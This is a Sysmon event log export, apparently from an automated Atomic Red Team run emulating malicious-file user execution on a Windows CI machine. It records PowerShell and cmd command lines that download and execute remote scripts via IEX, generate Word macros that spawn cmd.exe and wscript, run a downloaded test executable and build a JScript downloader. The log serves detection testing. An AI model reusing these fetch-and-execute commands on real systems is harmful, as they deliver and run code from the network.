"12/17/2025 7:58:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:44.629
ProcessGuid: {f995aebf-62b4-6942-ac04-000000000e00}
ProcessId: 2968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:43.098
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
QueryName: amtso.eicar.org
QueryStatus: 0
QueryResults: ::ffff:81.7.7.163;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:41.964
ProcessGuid: {f995aebf-62b1-6942-a504-000000000e00}
ProcessId: 8208
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:43.839
ProcessGuid: {f995aebf-62b3-6942-aa04-000000000e00}
ProcessId: 5980
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u231ezwb.yqy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:43.821
ProcessGuid: {f995aebf-62b3-6942-aa04-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u231ezwb.yqy.ps1
CreationUtcTime: 2025-12-17 07:58:43.821
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:41.968
ProcessGuid: {f995aebf-62b1-6942-a504-000000000e00}
ProcessId: 8208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59050
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:43.746
ProcessGuid: {f995aebf-62b3-6942-aa04-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macroCode = Get-Content \""""C:\AtomicRedTeam\atomics/T1204.002/src/test9-GenericPayloadDownload.txt\"""" -Raw
$URL = \""""\"""" + \""""/\"""" + \""""\""""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\""""
Invoke-MalDoc -macroCode $macroCode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:43.469
ProcessGuid: {f995aebf-62b3-6942-a904-000000000e00}
ProcessId: 5996
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
ParentProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ParentProcessId: 9120
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:40.272
ProcessGuid: {f995aebf-62af-6942-a104-000000000e00}
ProcessId: 5616
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:43.309
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\PotentiallyUnwanted.exe
CreationUtcTime: 2025-12-17 07:58:43.309
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:42.648
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rmrtrpnj.wgn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:42.630
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rmrtrpnj.wgn.ps1
CreationUtcTime: 2025-12-17 07:58:42.630
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:42.557
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:41.750
ProcessGuid: {f995aebf-62b1-6942-a504-000000000e00}
ProcessId: 8208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qknwazyn.itj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:41.734
ProcessGuid: {f995aebf-62b1-6942-a504-000000000e00}
ProcessId: 8208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qknwazyn.itj.ps1
CreationUtcTime: 2025-12-17 07:58:41.732
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:40.276
ProcessGuid: {f995aebf-62af-6942-a104-000000000e00}
ProcessId: 5616
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59049
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:41.654
ProcessGuid: {f995aebf-62b1-6942-a504-000000000e00}
ProcessId: 8208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ExecChrome\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:39.391
ProcessGuid: {f995aebf-62af-6942-9f04-000000000e00}
ProcessId: 2588
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:41 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:38.487
ProcessGuid: {f995aebf-62ae-6942-9d04-000000000e00}
ProcessId: 6016
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:40.942
ProcessGuid: {f995aebf-62b0-6942-a304-000000000e00}
ProcessId: 268
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_woww1aev.5fq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:40 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:40.924
ProcessGuid: {f995aebf-62b0-6942-a304-000000000e00}
ProcessId: 268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_woww1aev.5fq.ps1
CreationUtcTime: 2025-12-17 07:58:40.924
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:39.395
ProcessGuid: {f995aebf-62af-6942-9f04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59048
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:40 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:37.798
ProcessGuid: {f995aebf-62ad-6942-9c04-000000000e00}
ProcessId: 7116
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\cscript.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:40.054
ProcessGuid: {f995aebf-62af-6942-a104-000000000e00}
ProcessId: 5616
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ieynry5k.kob.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:40 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:40.038
ProcessGuid: {f995aebf-62af-6942-a104-000000000e00}
ProcessId: 5616
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ieynry5k.kob.ps1
CreationUtcTime: 2025-12-17 07:58:40.038
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:39.961
ProcessGuid: {f995aebf-62af-6942-a104-000000000e00}
ProcessId: 5616
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""$(\""""$env:temp\art1204.bat\"""")`\"""" For Output As #1`n   Write #1, `\""""calc.exe`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c $(\""""$env:temp\art1204.bat\"""") `\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct Word}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:38.491
ProcessGuid: {f995aebf-62ae-6942-9d04-000000000e00}
ProcessId: 6016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59047
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:39.171
ProcessGuid: {f995aebf-62af-6942-9f04-000000000e00}
ProcessId: 2588
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pu5wgyiz.vut.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:39.154
ProcessGuid: {f995aebf-62af-6942-9f04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pu5wgyiz.vut.ps1
CreationUtcTime: 2025-12-17 07:58:39.154
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:37.061
ProcessGuid: {f995aebf-62ac-6942-9804-000000000e00}
ProcessId: 9932
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:39.073
ProcessGuid: {f995aebf-62af-6942-9f04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   a = Shell(`\""""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"""", vbNormalFocus)`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:37.065
ProcessGuid: {f995aebf-62ac-6942-9804-000000000e00}
ProcessId: 9932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59045
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:38.260
ProcessGuid: {f995aebf-62ae-6942-9d04-000000000e00}
ProcessId: 6016
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jqrca34b.huy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:38.237
ProcessGuid: {f995aebf-62ae-6942-9d04-000000000e00}
ProcessId: 6016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jqrca34b.huy.ps1
CreationUtcTime: 2025-12-17 07:58:38.237
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:38.162
ProcessGuid: {f995aebf-62ae-6942-9d04-000000000e00}
ProcessId: 6016
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""  a = Shell(`\""""cmd.exe /c choice /C Y /N /D Y /T 3`\"""", vbNormalFocus)\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:37.730
ProcessGuid: {f995aebf-62ad-6942-9c04-000000000e00}
ProcessId: 7116
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: cscript  //E:Jscript C:\Users\RUNNER~1\AppData\Local\Temp\OSTapGet.js
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62ad-6942-9a04-000000000e00}
ParentProcessId: 5776
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c echo var url = ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js & cscript //E:Jscript %TEMP%\OSTapGet.js
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:36.825
ProcessGuid: {f995aebf-62ac-6942-9804-000000000e00}
ProcessId: 9932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ruqhzdeh.jbe.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:36 AM","11","File created:
RuleName: FileCreate
